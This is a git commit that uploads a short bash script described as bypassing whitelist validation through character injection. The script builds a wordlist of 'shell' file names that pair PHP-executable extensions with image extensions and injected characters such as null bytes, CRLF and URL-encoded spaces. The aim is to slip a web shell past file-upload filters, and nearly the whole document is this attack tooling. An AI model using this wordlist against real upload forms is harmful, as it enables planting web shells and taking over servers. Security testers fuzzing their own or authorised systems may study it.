cd7df58b3da96629f10d3aa2e6719d64fca1c6ac
tobiasGuta <156011774+tobiasGuta@users.noreply.github.com>
2024-06-03 14:04:27 -0400

    Add files via upload
    bypassing a whitelist validation test through Character Injection.

---
+++ bypassing-whitelist-medium.sh
@@ -0,0 +1,18 @@
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+    for ext in '.pht' '.phar' '.pgif' '.phtml' '.phtm' '.php' '.php3' '.php4' '.php5' '.phps' '.jpg' '.jpeg' '.png' '.gif' '.bmp' '.svg' '.tiff'; do
+        echo "shell$char$ext" >> wordlist.txt
+        echo "shell$ext$char" >> wordlist.txt
+        echo "shell.jpg$char$ext" >> wordlist.txt
+        echo "shell.jpg$ext$char" >> wordlist.txt
+        echo "shell.png$char$ext" >> wordlist.txt
+        echo "shell.png$ext$char" >> wordlist.txt
+        echo "shell.gif$char$ext" >> wordlist.txt
+        echo "shell.gif$ext$char" >> wordlist.txt
+        echo "shell.bmp$char$ext" >> wordlist.txt
+        echo "shell.bmp$ext$char" >> wordlist.txt
+        echo "shell.svg$char$ext" >> wordlist.txt
+        echo "shell.svg$ext$char" >> wordlist.txt
+        echo "shell.tiff$char$ext" >> wordlist.txt
+        echo "shell.tiff$ext$char" >> wordlist.txt
+    done
+done
